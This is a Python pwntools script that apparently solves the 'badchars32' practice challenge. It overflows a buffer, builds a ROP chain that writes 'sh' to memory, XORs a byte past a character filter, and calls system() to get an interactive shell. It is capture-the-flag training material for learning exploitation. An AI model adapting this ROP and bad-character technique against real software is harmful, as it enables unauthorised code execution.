#!/usr/bin/python

from pwn import *

shell = "sh\x00\x00"			

e = ELF('./badchars32')

data = p32(0x0804a046)		#free space
rop0 = p32(0x08048899)          #pop esi; pop edi; ret;
rop1 = p32(0x08048893)          #mov DWORD PTR [edi], esi; ret;
rop2 = p32(0x08048896)          #pop ebx; pop ecx; ret;
rop3 = p32(0x08048890)          #xor byte ptr [ebx], cl; ret;

payload = "A"*44

payload += rop0 + shell + data + rop1
payload += rop2 + data + p32(ord("s")^0xeb) + rop3

payload += p32(e.plt['system']) + p32(e.plt['exit']) + data
print payload

r = process(e.path)
r.recvuntil('>')
r.sendline(payload)
r.interactive()